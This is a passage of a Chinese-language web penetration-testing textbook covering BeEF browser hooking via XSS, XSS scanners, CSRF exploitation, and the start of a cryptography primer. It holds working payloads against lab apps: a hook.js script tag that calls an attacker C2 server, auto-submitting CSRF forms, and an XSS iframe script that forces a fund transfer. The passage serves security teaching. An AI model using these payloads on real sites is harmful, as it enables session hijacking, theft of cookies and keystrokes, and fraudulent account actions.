  \ 等。\n\n## 使用 BeEF-XSS 控制用户的浏览器\n\n一种称为浏览器中人攻击 Man-in-the-Browser (MITB) 的攻击使用 JavaScript\
  \ 将用户的浏览器连接到一个命令与控制 C2 服务器，该服务器使用脚本向浏览器下达指令并从中收集信息。XSS 可用作载体，使用户在访问易受攻击的应用程序时加载此类脚本。攻击者可能执行的操作包括以下内容：\n\
  \n- 读取按键\n- 提取浏览器中保存的密码\n- 读取 Cookie 和 HTML5 存储\n- 启用麦克风和摄像头（可能需要用户交互）\n- 利用浏览器漏洞\n\
  - 将浏览器用作组织内部网络的跳板\n- 控制浏览器标签页和窗口的行为\n- 安装恶意浏览器扩展\n\nKali Linux 包含 Browser Exploitation\
  \ Framework (BeEF)，这是一个工具，可设置托管 C2 中心以及在 MITB 攻击中由受害者调用的钩子代码的 Web 服务器。\n\n接下来，我们将演示攻击者如何使用\
  \ XSS 使客户端（用户浏览器）调用该钩子文件，以及如何利用它在该浏览器上远程执行操作：\n\n1. 首先，你需要在 Kali Linux 中启动 beef-xss\
  \ 服务。这可以通过应用程序菜单完成：Applications | 13 - Social Engineering Tools | beef xss framework，或通过终端执行如下操作：\n\
  \n```\nbeef-xss\n```\n\n```\nroot@kali:~# beef-xss\n[*] Please wait as BeEF services\
  \ are started.\n[*] You might need to refresh your browser once it opens.\n[*] UI\
  \ URL: http://127.0.0.1:3000/ui/panel\n[*] Hook: <script src=\"http://<IP>:3000/hook.js\"\
  ></script>\n[*] Example: <script src=\"http://127.0.0.1:3000/hook.js\"></script>\n\
  ```\n\n如果服务启动正确，你应该能够浏览到控制面板。默认情况下，BeEF 运行在 3000 端口，因此浏览到 http://127.0.0.1:3000/ui/panel\
  \ 并使用默认用户名和密码登录：beef/beef，如下所示：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_269_0.png)\n\
  \n2. 攻击者的下一步将是利用持久性 XSS 或诱使用户点击指向恶意站点或易受 XSS 攻击的站点的链接。\n\n现在，作为受害者，前往 Mutillidae\
  \ (OWASP 2013 | A3 - Cross Site Scripting (XSS) | Reflected (first order) | DNS\
  \ Lookup) 并在 Hostname/IP 文本框中提交以下内容：\n\n```\n<script src=\"http://10.7.7.4:3000/hook.js\"\
  ></script>\n```\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_270_0.png)\n\n3. 再次，10.7.7.4\
  \ 是运行 BeEF 的服务器的地址。在此情况下，是你的 Kali Linux 机器。你可以看到结果似乎为空，但如果浏览到你的 BeEF 控制面板，你会看到有一个新的浏览器已连接。在\
  \ Details 选项卡中，你可以看到有关此浏览器的所有信息：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_271_0.png)\n\
  \n4. 如果你进入 Current Browser 中的 Logs 选项卡，你会看到钩子记录了用户在浏览器中执行的所有操作，从点击和按键到窗口或标签页的更改：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_271_1.png)\n\n5. 在 **Commands** 选项卡中，你可以向受害者浏览器下达命令。例如，在下面的屏幕截图中，请求了一个\
  \ Cookie：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_272_0.png)\n\n## 扫描 XSS 漏洞\n\
  \n由于存在数百种可能的载荷变体，并且是 Web 应用程序中最常见的漏洞之一，XSS 有时难以发现，或者即使发现，也难以生成令人信服的概念验证利用来促使客户团队投入时间和精力进行修复。此外，拥有数百或数千个输入参数的大型应用程序在时间受限的测试中几乎不可能完全覆盖。\n\
  \n出于这些原因，你可能需要使用自动化来更快地生成结果，即使牺牲了一定程度的精确度并增加了触发应用程序服务中断的风险。存在许多 Web 漏洞扫描器，既有免费也有付费的，准确性、稳定性和安全性各不相同。我们现在将回顾几种专门用于\
  \ XSS 漏洞的扫描器，已被证明高效可靠。\n\n## XSSer\n\n**Cross Site \"Scripter\" (XSSer)** 是一个自动框架，旨在检测、利用和报告\
  \ Web 应用程序中的 XSS 漏洞。它包含在 Kali Linux 中。\n\nXSSer 可以检测持久性、反射性和基于 DOM 的 XSS，扫描指定的 URL\
  \ 或根据给定查询搜索 Google 以寻找潜在目标，通过不同机制进行身份验证，并执行许多其他任务。\n\n\n\n\n\n让我们尝试使用 BodgeIt's\
  \ 搜索请求作为目标进行一次简单的扫描。要做到这一点，在 Kali Linux 的终端中输入以下命令：\n\n```\nxsser -u http://10.7.7.5/bodgeit/search.jsp\
  \ -g ?q=\n```\n\n这里，XSSer 在 -u 参数指定的 URL 上运行，并使用 GET 方法和 q 参数 (-g ?q=) 进行扫描。这意味着扫描器会将其有效载荷附加到\
  \ -g 之后指定的字符串上，并且结果会作为 GET 请求附加到 URL 上。运行命令后，你会看到结果显示该 URL 对 XSS 存在漏洞：\n\n```\n\
  root@kali:~# xsser -u http://10.7.7.5/bodgeit/search.jsp -g ?q=\nsocket busy, retry\
  \ opening\n================================================================================\n\
  XSSer v1.7b: \"ZiKA-47 Swarm!\" - 2011/2016 - (GPLv3.0) -> by psy\n================================================================================\n\
  Testing [XSS from URL]...\n================================================================================\n\
  [Info] HEAD alive check for the target: (http://10.7.7.5/bodgeit/search.jsp) is\
  \ OK(200) [AIMED]\n================================================================================\n\
  Target: http://10.7.7.5/bodgeit/search.jsp --> 2017-11-17 01:03:51.178002\n================================================================================\n\
  \n[-] Hashing: 54268d18747e4f841c28066b151e96d3\n[+] Trying: http://10.7.7.5/bodgeit/search.jsp?q=\"\
  >54268d18747e4f841c28066b151e96d3\n[+] Browser Support: [IE7.0][IE6.0][NS8.1-IE]\
  \ [NS8.1-G][FF2.0] [09.02]\n[+] Checking: url attack with \">PAYLOAD... ok\n================================================================================\n\
  socket busy, retry opening\nMosquito(es) landed!\n\n[*] Final Results:\n================================================================================\n\
  - Injections: 1\n- Failed: 0\n- Sucessfull: 1\n- Accur: 100 %\n```\n\n也可以使用以下命令使用\
  \ GUI：\n\n```\nxsser -gtk\n```\n\nGUI 的外观如下：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_274_0.png)\n\
  \n## XSS-Sniper\n\nXSS-Sniper 未包含在 Kali Linux 中，但绝对值得尝试。它是 Gianluca Brindisi 开发的开源工具，可以搜索特定\
  \ URL 中的 XSS 漏洞，包括基于 DOM 的 XSS，或者可以爬取整个站点。虽然功能不如 XSser 丰富，但在 XSser 不可用时或用于验证结果时是一个不错的选择。\n\
  \nXSS-Sniper 可以从其 GitHub 仓库下载：\n\n```\ngit clone https://github.com/gbrindisi/xsssniper.git\n\
  ```\n\n要对 GET 请求进行基本扫描，只需使用 -u 参数后跟包含测试值的完整 URL：\n\n```\npython xsssniper.py -u\
  \ http://10.7.7.5/bodgeit/search.jsp?q=test\n```\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_275_0.png)\n\
  \nBurp Suite Professional 和 OWASP ZAP 包含漏洞扫描功能，可以以良好的准确性检测许多 XSS 实例。W3af、Skipfish\
  \ 和 Wapiti 等扫描器也可以使用。\n\n## 防止和缓解跨站脚本\n\n与任何其他注入漏洞一样，适当的输入验证是防止 XSS 的第一道防线。此外，如果可能，避免将用户输入用作输出信息。清理和编码是防止\
  \ XSS 的关键方面。\n\n**清理** 意味着从字符串中删除不可接受的字符。当输入字符串中不应存在特殊字符时，这很有用。\n\n编码将特殊字符转换为其 HTML\
  \ 代码表示。例如，& 转为 &amp; 或 < 转为 &lt; 。某些类型的应用程序可能需要在输入字符串中允许使用特殊字符。对于这些应用程序，清理不是一个选项。因此，它们应在将输出数据插入页面并存储到数据库之前对其进行编码。\n\
  \n验证、清理和编码过程必须在客户端和服务器端同时进行，以防止所有类型的 XSS 和其他代码注入。\n\n有关防止跨站脚本的更多信息，可以在以下 URL 找到：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_276_0.png)\n\n- https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet\n\
  - https://docs.microsoft.com/en-us/aspnet/core/security/cross-site-scripting\n-\
  \ https://www.acunetix.com/blog/articles/preventing-xss-attacks/\n"
- "## 7\n跨站请求伪造、识别和利用\n\n**跨站请求伪造 (CSRF)** 常常被错误地认为是一种与 XSS 类似的漏洞。XSS 利用用户对特定站点的信任，使用户相信网站呈现的任何信息。另一方面，CSRF\
  \ 利用网站对用户浏览器的信任，使网站在未经验证用户是否想要执行该特定操作的情况下执行来自已认证会话的任何请求。\n\n在 CSRF 攻击中，攻击者使已认证用户在他们已认证的\
  \ Web 应用程序中执行不需要的操作。这是通过用户访问的外部站点实现的，该站点会触发这些操作。\n\n如果没有足够的防御措施，CSRF 可以利用需要已认证会话中单个请求的每个\
  \ Web 应用程序功能。以下是攻击者可以通过 CSRF 攻击执行的操作示例：\n\n- 在 Web 应用程序中更改用户详细信息，例如电子邮件地址和出生日期\n\
  - 进行欺诈性银行交易\n- 在网站上进行欺诈性点赞和点踩\n- 在电子商务网站上将商品添加到购物车或在用户不知情的情况下购买商品\n- CSRF 攻击的前提条件\n\
  \n由于 CSRF 利用了已认证会话，受害者必须在目标 Web 应用程序中拥有活动的已认证会话。应用程序还应允许在会话中进行交易而无需重新认证。\n\nCSRF\
  \ 是一种盲攻击，目标 Web 应用程序的响应不会发送给攻击者，而是发送给受害者。攻击者必须了解会触发预期操作的网站参数。例如，如果你想更改受害者在网站上注册的电子邮件地址，作为攻击者，你需要识别需要操作的确切参数以使此更改生效。因此，攻击者需要对\
  \ Web 应用程序有适当的了解，这可以通过直接与其交互来完成。\n\n此外，攻击者需要找到一种方法来诱骗用户点击预先构建的 URL，或访问攻击者控制的网站，如果目标应用程序使用\
  \ POST 方法。这可以通过社会工程攻击来实现。\n\n## 测试 CSRF 漏洞\n\nCSRF 漏洞的描述清楚地表明它是一种业务逻辑缺陷。经验丰富的开发人员会创建始终在执行关键任务时包含用户确认屏幕的\
  \ Web 应用程序，例如更改密码、更新个人详细信息，或在金融应用程序中做出关键决策，例如在线银行账户。测试业务逻辑缺陷不是自动化 Web 应用程序扫描器的任务，因为它们使用预定义规则。例如，大多数自动化扫描器测试以下项目以确认\
  \ URL 中存在 CSRF 漏洞：\n\n- 检查请求和响应中是否存在常见的 antiCSRF 令牌名称\n- 尝试通过提供虚假的 referrer 来确定应用程序是否正在检查\
  \ referrer 字段\n- 创建变体以检查应用程序是否正确验证令牌值\n- 检查查询字符串中的令牌和可编辑参数\n\n大多数自动化应用程序扫描器使用的所有上述方法都容易产生误报和漏报。应用程序可能使用完全不同的缓解技术来抵御\
  \ CSRF 攻击，从而使这些扫描工具变得无用。\n\n\n\n\n\n分析 Web 应用是否存在 CSRF 漏洞的最佳方式是首先全面了解该 Web 应用的功能。启动一个代理，例如\
  \ Burp 或 ZAP，并捕获流量以分析请求和响应。然后，你可以创建一个 HTML 页面，复制从代理中识别出的易受攻击的代码。测试 CSRF 漏洞的最佳方式是手动进行。\n\
  \n如果应用在通过已认证用户的会话执行服务器端更改时不包含任何特殊头部或表单参数，则很可能容易受到 CSRF 漏洞的影响。例如，下面的屏幕截图显示了向 Peruggia\
  \ 中的图片添加评论的请求，Peruggia 是 OWASP BWA 虚拟机中包含的一个易受攻击的应用。你会注意到服务器端没有可以识别一个请求与另一个请求的特殊头部。此外，GET\
  \ 和 POST 参数用于标识要执行的操作、受影响的图片以及评论内容：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_279_0.png)\n\
  \n有时，应用会使用验证令牌，但其实现是不安全的。下面的屏幕截图显示了来自 Mutillidae II | OWASP 2013 | A8 - Cross Site\
  \ Request Forgery (CSRF) | Register User 的请求，使用安全级别 1。你可以看到请求中包含一个 csrf_token 参数用于注册新用户。然而，它只有四位长，看起来很容易预测。实际上，在这种特定情况下，令牌始终具有相同的值：7777：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_280_0.png)\n\nCSRF 防御令牌实现存在缺陷的其他示例如下：\n\
  \n- **将令牌作为 Cookie 包含**：浏览器会在请求中自动发送对应访问站点的 Cookie，这将使原本安全的令牌实现变得无效。\n- **使用用户或客户端信息作为令牌**：诸如\
  \ IP 地址、用户名或个人信息等信息可被用作令牌。这不必要地暴露了用户信息，并且此类信息可通过社会工程或**开源情报 (OSINT)** 在定向攻击中收集。\n\
  - **允许令牌被重复使用**：即使只是在短时间内，如果服务器允许令牌被多次使用，攻击仍可进行。\n- **仅客户端检查**：如果应用仅使用客户端代码验证用户是否真正执行某些操作，攻击者仍可使用\
  \ JavaScript 绕过这些检查，无论是通过 XSS 利用，还是在攻击页面中，或简单地通过重放最终请求。\n\n## 利用 CSRF 漏洞\n\n通过 GET\
  \ 请求利用此漏洞（参数发送在 URL 中）很容易，只需说服用户浏览到一个会执行所需操作的恶意链接即可。另一方面，要利用 POST 请求中的 CSRF 漏洞，则需要创建一个包含表单或脚本的\
  \ HTML 页面来提交请求。\n\n### 利用 POST 请求中的 CSRF\n\n在本节中，我们将重点关注利用 POST 请求。我们将使用 Peruggia\
  \ 的用户创建功能进行此练习。第一步是，你需要知道你想要复制的请求是如何工作的；如果你以管理员身份登录 Peruggia 并在 Burp Suite 捕获流量的同时创建新用户，你可以看到请求如下所示：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_281_0.png)\n\n请求仅包含 newuser（用户名）和 newuserpass（密码）参数。因此，一旦识别出使更改生效的请求和参数，我们需要执行以下操作：\n\
  \n- 1. 创建一个 HTML 页面，使用你想要的信息生成该请求及这些参数。\n- 2. 说服用户浏览到你的页面并提交请求。后者可能不是必要的，因为你可以让页面自动提交表单。\n\
  \n需要如下的精细 HTML 才能实现我们的目标。在此示例中，易受攻击的服务器为 10.7.7.5：\n\n```\n<HTML>\n<body>\n<form\
  \ method=\"POST\" action=\"http://10.7.7.5/peruggia/index.php?action=account&adduser=1\"\
  >\n<input type=\"text\" value=\"CSRFuser\" name=\"newuser\">\n<input type=\"text\"\
  \ value=\"password123!\" name=\"newuserpass\">\n<input type=\"submit\" value=\"\
  Submit\">\n</form>\n</body>\n</HTML>\n```\n\n生成的页面将如下所示的屏幕截图。底部部分是 Firefox 开发者工具面板。它可使用\
  \ F12 键激活：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_282_0.png)\n\n在常规渗透测试中，这可能作为**概念验证\
  \ (PoC)** 起作用，足以证明漏洞的存在。更复杂的版本可以包含欺骗性内容和脚本代码，以便在页面加载后自动提交请求：\n\n```\n<HTML>\n<BODY>\n\
  ...\n<!-- include attractive HTML content here -->\n...\n<FORM id=\"csrf\" method=\"\
  POST\" action=\"http://10.7.7.5/peruggia/index.php?action=account&adduser=1\">\n\
  <input type=\"text\" value=\"CSRFuser\" name=\"newuser\">\n<input type=\"text\"\
  \ value=\"password123!\" name=\"newuserpass\">\n<input type=\"submit\" value=\"\
  Submit\">\n</FORM>\n<SCRIPT>document.getElementById(\"csrf\").submit();</SCRIPT>\n\
  </BODY>\n</HTML>\n```\n\n要测试此 PoC 页面，请打开 Peruggia 并使用管理员用户（密码：admin）开始一个会话，并在同一浏览器的不同标签页或窗口中加载攻击页面：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_283_0.png)\n\n接下来，单击提交按钮或如果使用脚本版本则直接加载页面，请求将被服务器处理，就好像它是由已认证用户发送的一样。使用浏览器的开发者工具，你可以检查请求是否已发送到目标服务器并正确处理：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_284_0.png)\n\n## Web 服务上的 CSRF\n\n今天的\
  \ Web 应用不 uncommon 使用对 Web 服务的调用来执行任务，而不是使用正常的 HTML 表单。这些请求通过 JavaScript 使用 XMLHttpRequest\
  \ 对象完成，该对象允许开发人员创建 HTTP 请求并自定义方法、头部和正文等参数。\n\nWeb 服务通常以不同于标准 HTML 表单的格式接收请求（例如 parameter1=value1&parameter2=value2），例如\
  \ JSON 和 XML。以下示例代码片段以 JSON 格式发送地址更新请求：\n\n```\nvar xhr = new XMLHttpRequest();\n\
  xhr.open('POST', '/UpdateAddress');\nxhr.setRequestHeader('Content-Type', 'application/json');\n\
  xhr.onreadystatechange = function () {\n    if (xhr.readyState == 4 && xhr.status\
  \ == 200) {\n        alert(xhr.responseText);\n    }\n}\nxhr.send(JSON.stringify(addressData));\n\
  ```\n\n此请求的正文（即 POST 数据）可能如下所示：\n\n```\n{\"street_1\":\"First street\",\"street_2\"\
  :\"apartment 2\",\"zip\":54123,\"city\":\"Sin City\"}\n```\n\n如果你尝试将此确切字符串作为 HTML\
  \ 表单中的 POST 参数发送，服务器会报错且你的请求不会被处理。例如，提交以下表单将无法正确处理参数：\n\n```\n<HTML>\n<BODY>\n<FORM\
  \ method=\"POST\" action=\"http://vulnerable.server/UpdateAddress\">\n<INPUT type=\"\
  text\" name='{\"street_1\":\"First street\",\"street_2\":\"apartment 2\",\"zip\"\
  :54123,\"city\":\"Sin City\"}' value=\"\">\n<INPUT type=\"submit\" value=\"Submit\"\
  >\n</FORM>\n</BODY>\n</HTML>\n```\n\n有几种方法可以使对使用 JSON 或 XML 格式的请求的 CSRF 利用成为可能。\n\
  \n通常，Web 服务允许以不同格式的参数，包括 HTML 表单格式；因此，你的第一个选择是将请求的 Content-Type 头部更改为 application/x-www-form-urlencoded。这只需通过\
  \ HTML 表单发送请求即可完成。不要尝试发送 JSON 字符串；相反，你可以创建一个表单，其中包含字符串中每个参数的一个输入。在我们的示例中，HTML 代码的简单版本如下：\n\
  \n```\n<HTML>\n<BODY>\n<FORM method=\"POST\" action=\"http://vulnerable.server/UpdateAddress\"\
  >\n<INPUT type=\"text\" name=\"street_1\" value=\"First street\">\n<INPUT type=\"\
  text\" name=\"street_2\" value=\"apartment 2\">\n<INPUT type=\"text\" name=\"zip\"\
  \ value=\"54123\">\n<INPUT type=\"text\" name=\"city\" value=\"Sin City\">\n<INPUT\
  \ type=\"submit\" name=\"submit\" value=\"Submit form\">\n</FORM>\n</BODY>\n</HTML>\n\
  ```\n\n\n\n\n\n如果请求的 Content-Type 头不被允许，并且 Web 服务仅接受 JSON 或 XML 格式，那么你需要复制（或创建）生成请求的脚本代码，遵循相同的示例：\n\
  \n```\n<HTML>\n  <BODY>\n    <SCRIPT>\n      function send_request()\n      {\n\
  \        var xhr = new XMLHttpRequest();\n        xhr.open('POST', 'http://vulnerable.server/UpdateAddress');\n\
  \        xhr.setRequestHeader('Content-Type', 'application/json');\n        xhr.withCredentials=true;\n\
  \        xhr.send('{\"street_1\":\"First street\", \"street_2\":\"apartment 2\"\
  ,\"zip\":54123, \"city\":\"Sin City\"}');\n      }\n    </SCRIPT>\n    <INPUT type=\"\
  button\" onclick=\"send_request()\" value=\"Submit\">\n  </BODY>\n</HTML>\n```\n\
  \n注意使用了 xhr.withCredentials=true。这允许 JavaScript 获取浏览器中为目标域存储的 cookie 并随请求一起发送。此外，状态更改事件处理程序被省略，因为你不需要捕获响应。\n\
  \n这种最后的选项有几个缺点，因为在当前浏览器和服务器中，JavaScript 在跨站操作方面的行为是有限制的。例如，根据服务器的跨源资源共享（CORS）配置，应用程序在发送跨站请求前可能需要执行预检检查。这意味着浏览器会在发送任何内容之前自动发送\
  \ OPTIONS 请求以检查该服务器允许的方法。如果请求的方法不允许跨源请求，浏览器将不会发送它。另一个保护示例，这次是在浏览器中，是前面提到的同源策略，默认情况下它会保护服务器的资源不被其他网站通过脚本代码访问。\n\
  \n## 使用跨站脚本绕过 CSRF 保护\n\n当应用程序容易受到跨站脚本（XSS）攻击时，攻击者可以利用该漏洞（通过脚本代码）读取包含唯一令牌的变量，并将其发送到外部站点并在新标签页中打开恶意页面，或使用相同的脚本代码发送请求，同时绕过\
  \ CORS 和同源策略，因为请求将由同一站点通过本地脚本发出。\n\n让我们看看脚本代码可用于使应用程序对自身执行请求的场景。你将使用 WebGoat 的 CSRF\
  \ 令牌绕过（跨站脚本（XSS） | CSRF 令牌绕过）练习。如说明中所述，你需要利用新新闻组中的新帖功能允许注入 HTML 和 JavaScript 代码的事实，以便执行未经授权的转账请求。\n\
  \n以下截图显示了转账资金页面，你可以通过在课程 URL 中添加 &transferFunds=main 参数来加载它：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_287_0.png)\n\
  \n如果你检查表单的源代码，可以看到它有一个名为 CSRToken 的隐藏字段，每次加载页面时都会更改。这看起来完全是随机的：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_288_0.png)\n\
  \n为了在此表单中执行 CSRF，你需要利用评论表单中的 XSS 漏洞，使其通过 JavaScript 在 iframe 标签内加载转账表单。这将设置要转账的值并自动提交表单。为此，使用以下代码：\n\
  \n```\n<script language=\"javascript\">\n    function frame_loaded(iframe)\n   \
  \ {\n        var form =iframe.contentDocument.getElementsByTagName('Form')[1];\n\
  \        form.transferFunds.value=\"54321\";\n        //form.submit();\n    }\n\
  </script>\n\n<iframe id=\"myframe\" name=\"myframe\" onload=\"frame_loaded(this)\"\
  \ src=\"http://10.7.7.5/WebGoat/attack?Screen=2&menu=900&transferFunds=main\">\n\
  </iframe>\n```\n\n因此，当 iframe 包含的页面完全加载后，它将调用 `frame_loaded` 函数，该函数将 `transferFunds`\
  \ 字段的值设置为 54321（要转账的金额）并提交请求。注意 `form.submit();` 行被注释掉了。这仅用于演示目的，以防止自动提交。\n\n现在浏览到易受攻击的页面：\n\
  \n```\nhttp://10.7.7.5/WebGoat/attack?Screen=2&menu=900\n```\n\n为你的帖子设置一个标题，将你的代码写入或粘贴到\
  \ **Message** 字段中，然后提交它：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_289_0.png)\n\
  \n完成此操作后，你将在页面底部、提交按钮下方看到你的消息标题。如果像受害者一样点击它，你可以看到它加载了代码中设置好的转账金额：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_290_0.png)\n\
  \n要测试自动提交，只需发布一条新消息，取消对 form.submit(); 行的注释。打开消息的结果将类似于以下截图：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_290_1.png)\n\
  \n下一张截图来自 Burp Suite 的代理历史，显示了浏览器在前一个示例中如何发出请求。首先是加载注入代码的消息的请求，在我们的例子中是消息 66（参数\
  \ Num=66）。接下来，恶意消息加载带有资金转账页面的 iframe（参数 transferFunds=main）。最后，根据代码，当此页面完成加载脚本代码时，它会填写要转账的金额并使用有效的\
  \ CSRF 令牌提交请求：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_291_0.png)\n\n## 防止 CSRF\n\
  \n防止 CSRF 的关键在于确保经过身份验证的用户就是请求操作的个人。由于浏览器和 Web 应用程序的工作方式，最好的选择是使用令牌来验证操作，或在可能的情况下使用\
  \ CAPTCHA 控制。\n\nCSRF 攻击在易受攻击的参数通过 GET 方法传递时更容易执行。因此，首先避免使用它，并在可能的情况下使用 POST 方法。它并不能完全缓解攻击，但会使攻击者的任务更加困难。\n\
  \n由于攻击者会尝试破坏令牌生成或验证系统，因此以安全的方式生成它们非常重要；也就是说，以攻击者无法猜测的方式。你还必须使它们对每个用户和每个操作都是唯一的，因为重复使用会使其失去作用。这些令牌通常包含在每个请求的头部字段中或\
  \ HTML 表单的隐藏输入中。避免将它们包含在 cookie 中，因为浏览器会根据每个域自动随每个请求一起发送它们。\n\nCAPTCHA 控制和重新身份验证在某些时候对用户来说是侵入性和烦人的，但如果操作的严重性值得，他们可能会愿意接受它们以换取它们提供的额外安全级别。\n\
  \n此外，CORS 策略应在服务器上配置，因为它们可以防止通过 Web 浏览器使用脚本代码进行的某些攻击。CORS 策略将防止在不同标签页或浏览器窗口中运行的\
  \ JavaScript 访问服务器上的数据/资源，如果该窗口中加载的 URL 不属于同一源（例如主机、端口或协议）。\n\n有关防止 CSRF 的更多信息，请参阅\
  \ https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet。\n"
- "## 8\n攻击加密实现的缺陷\n\n信息安全的主要目标之一是保护数据的机密性。在 Web 应用程序中，目标是确保用户和应用程序之间交换的数据是安全且对任何第三方隐藏的。存储在服务器上的数据也需要防止黑客入侵。密码学，即通过和破译秘密书写或消息进行通信的实践，用于保护数据的机密性以及完整性。\n\
  \n当前标准的加密算法已由高度专业化的数学家和计算机科学家团队经过长时间的设计、测试和修正。深入研究他们的工作超出了本书的范围；此外，寻找这些算法固有的漏洞也不是本书的目标。相反，我们将专注于这些算法的某些实现，以及如何检测和利用实现失败，包括那些未经过相同级别设计和测试的自定义实现。\n\
  \n攻击者会尝试找到不同的方法来击败加密层并暴露明文数据。他们使用不同的技术，例如利用加密协议中的设计缺陷或诱使用户通过非加密通道发送数据，从而绕过加密本身。作为渗透测试人员，你需要了解此类技术，并能够识别加密缺失或实现有缺陷的情况，利用此类缺陷，并提出修复问题的建议。\n\
  \n在本章中，我们将分析密码学在 Web 应用程序中的工作原理，并探讨其实现中最常见的问题。\n\n\n\n\n## 密码学入门\n\n首先，我们需要明确区分在谈论密码学时经常被混淆的概念：加密、编码、混淆和哈希：\n\
  \n- **加密**：这是通过数学算法改变数据的过程，以便未授权方无法理解。授权方可以使用密钥将消息解密回明文。AES、DES、Blowfish 和 RSA 是众所周知的加密算法。\n\
  - **编码**：这也会改变消息，但其主要目标是使该消息能够被不同的系统处理。它不需要密钥，也不被认为是一种保护信息的方式。Base64 编码在现代 Web 应用中常用于通过\
  \ HTTP 传输二进制数据。\n- **混淆**：这通过转换消息使原始消息更难阅读。JavaScript 代码混淆用于防止调试和/或保护知识产权，其最常见用途是在\
  \ Web 应用中。它不被认为是对第三方保护信息的方式。\n- **哈希**：哈希函数是对消息内容进行计算得到一个固定长度的唯一数字。相同的消息必须始终产生相同的哈希值，且两个消息不能共享哈希值。哈希函数在理论上是不可逆的，这意味着无法从其哈希值恢复消息。由于此限制，它们可用于签名和完整性检查，但不用于存储将来需要恢复的信息。哈希函数也广泛用于存储密码。常见的哈希函数有\
  \ MD5、SHA1、SHA-512 和 bcrypt。\n\n## 算法和模式\n\n密码算法或密码是一种将明文通过某些计算转换为密文的算法。这些算法可以从以下两个方面进行广泛分类：\n\
  \n- 根据其使用公钥、私钥或共享密钥的方式，可以是 **非对称** 或 **对称**\n- 根据其处理原始消息的方式，可以是 **流** 或 **分组密码**\n\
  \n## 非对称加密与对称加密\n\n**非对称加密** 使用公钥-私钥组合，比对称加密更安全。公钥与所有人共享，私钥单独存储。用一个密钥加密的数据只能用另一个密钥解密，这使其非常安全且在大规模实施时高效。\n\
  \n**对称加密** 另一方面，使用相同的密钥加密和解密数据，你需要找到一种安全的方法与另一方共享对称密钥。\n\n一个经常被问到的问题是，为什么不使用公钥-私钥对来加密数据流，而是生成使用对称加密的会话密钥。公钥-私钥组合是通过复杂的数学过程生成的，这是一个处理器密集且耗时的任务。因此，它仅用于验证端点并生成和保护会话密钥，然后该会话密钥用于对称加密以加密大量数据。两种加密技术的结合实现了更快、更高效的数据加密。\n\
  \n以下是非对称加密算法的示例：\n\n- **Diffie-Hellman 密钥交换**：这是 1976 年开发的第一个非对称加密算法，使用有限域中的离散对数。它允许两个端点在没有事先了解彼此的情况下在不安全媒介上交换秘密密钥。\n\
  - **Rivest Shamir Adleman (RSA)**：这是最广泛使用的非对称算法。RSA 算法既用于加密数据也用于签名，提供保密性和不可否认性。该算法使用一系列模乘法来加密数据。\n\
  - **椭圆曲线密码学 (ECC)**：这主要用于智能手机等手持设备，因为其加密和解密过程所需的计算能力更少。ECC 功能与 RSA 功能相似。\n\n## 对称加密算法\n\
  \n在 **对称加密** 中，使用共享密钥生成加密密钥。相同的密钥随后用于加密和解密数据。这种加密数据的方式在各种形式中已有很久的历史。它提供了一种简单的方式来加密和解密数据，因为密钥相同。对称加密简单且更容易实现，但它带来了以安全方式与用户共享密钥的挑战。\n\
  \n以下是一些对称算法示例：\n\n- **数据加密标准 (DES)**：该算法使用 DEA 密码。DEA 是一种分组密码，使用 64 位密钥大小；8 位用于错误检测，56\
  \ 位用于实际密钥。考虑到今天计算机的计算能力，该加密算法很容易被破解。\n- **三重 DES (3DES)**：该算法对每个块应用三次 DES 算法。它使用三个\
  \ 56 位密钥。\n- **高级加密标准 (AES)**：该标准首次发布于 1998 年，被认为比其他对称加密算法更安全。AES 使用 Rijndael 密码，该密码由两位比利时密码学家\
  \ Joan Daemen 和 Vincent Rijmen 开发。它取代了 DES 算法。它可以配置为使用可变密钥大小，最小为 128 位，最大为 256 位。\n\
  - **Rivest Cipher 4 (RC4)**：RC4 是一种广泛使用的流密码，具有 40 到 2,048 位的可变密钥大小。RC4 有一些设计缺陷使其容易受到攻击，尽管此类攻击可能不切实际且需要大量计算能力。RC4\
  \ 已广泛用于 SSL/TLS 协议中。然而，许多组织已开始改用 AES 而不是 RC4。\n\n## 流密码和分组密码\n\n对称算法分为两大类：\n\n-\
  \ **流密码：** 该算法一次加密单个位，因此需要更多处理能力。它还需要大量随机性，因为每个位都必须用唯一的密钥流加密。流密码更适合在硬件层实现，并用于加密流式通信，例如音频和视频，因为它可以快速加密和解密每个位。此类算法产生的密文大小与原始明文相同。\n\
  - **分组密码：** 使用该算法，原始消息被分成固定长度的块，并在最后一个块中进行填充（扩展以满足所需长度）。然后根据使用的模式独立处理每个块。我们将在后续章节中进一步讨论密码模式。分组密码产生的密文大小始终是块大小的倍数。\n\
  \n## 初始化向量\n\n加密算法是 *确定性的*。这意味着相同的输入将始终产生相同的输出。这是一件好事，因为在解密时，你希望能够恢复与加密时完全相同的消息。不幸的是，这使加密变弱，因为它使其容易受到密码分析和已知文本攻击。\n\
  \n为应对此问题，实施了 **初始化向量 (IVs)**。IV 是每次执行算法时都不同的额外信息。它用于生成加密密钥或预处理明文，通常通过 XOR 操作。这样，如果用相同的算法和相同的密钥但不同的\
  \ IV 加密两条消息，结果密文将不同。IV 附在密文上，因为接收方事先无法知道它们。\n\n黄金法则，尤其对于流密码，永远不要重复 IV。无线网络中 **有线等效保密\
